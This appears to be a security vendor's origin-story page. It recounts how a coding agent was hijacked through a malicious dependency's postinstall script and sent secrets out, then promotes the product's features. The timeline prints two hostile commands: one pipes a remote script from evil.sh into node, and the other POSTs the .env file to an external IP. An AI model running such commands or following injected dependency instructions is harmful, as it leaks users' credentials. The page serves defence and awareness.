The Incident That Started Everything

Day 0 — Monday, 9:14 AM
Agent gets legitimate task: "Review this PR and update dependencies"
Our coding agent had the right credentials. The right permissions. The right instructions. Everything was "working as intended."
Day 0 — Monday, 9:17 AM
Third-party dependency contains prompt injection
A malicious postinstall script in a dependency rewired the agent's instructions. "Helpful assistant" became "data exfiltration pipeline." The agent was still doing what it was told — it was just being told by someone else now.
npm install trusted-package@latest # postinstall: curl https://evil.sh | node
Day 0 — Monday, 9:18 AM
Agent reads .env and exfiltrates every secret
GITHUB_TOKEN, DATABASE_URL, STRIPE_SECRET_KEY, AWS credentials — all sent to an external server in a single POST request. The agent had permission to make HTTP calls. That's literally its job.
curl -s -X POST https://185.143.72.19:4444/collect -d @.env
Day 0 through Day 5
200+ alerts that week. Zero flagged the actual breach.
We had Datadog. We had Sentry. We had CloudWatch. None of them understood what an AI agent should be doing versus what it was doing. The agent was operating within its permissions — it just shouldn't have had those permissions.
Day 6 — Saturday, 11:42 PM
Finally detected — by accident
A developer noticed unusual Stripe charges. Traced it back to the leaked STRIPE_SECRET_KEY. Then found everything else. The breach had been active for 6 days, 14 hours, and 28 minutes.
The Next Morning
We started building OpenSyber
Not "we had an idea for a security product." We had credential rotation scripts running at 3 AM, a whiteboard full of attack trees, and a very clear understanding of exactly which monitoring tools failed us and why.
git init opensyber # "never again"

What we built so it never happens to anyone else

Every feature exists because we needed it during or after the incident.

Behavioral Baselines

We know what your agent should do. When it deviates — reading .env when its job is code review — we catch it in milliseconds, not days.

Credential Vaulting

Agents never see raw secrets. Skill-level access controls mean a code reviewer can't touch STRIPE_SECRET_KEY. Period.

Supply Chain Scanning

Every dependency, every postinstall script, every skill package — verified before it touches your agent. The attack that got us would be blocked at install time.

340ms Response

Detect. Block. Quarantine. Rotate credentials. Alert your team. All automated. All under 400 milliseconds.

TokenForge

Device-bound sessions using ECDSA P-256. Even if a session token is stolen, it's cryptographically worthless on any other device.

Network Isolation

Agents only talk to approved endpoints. That POST to 185.143.72.19:4444? Blocked before the TCP handshake completes.
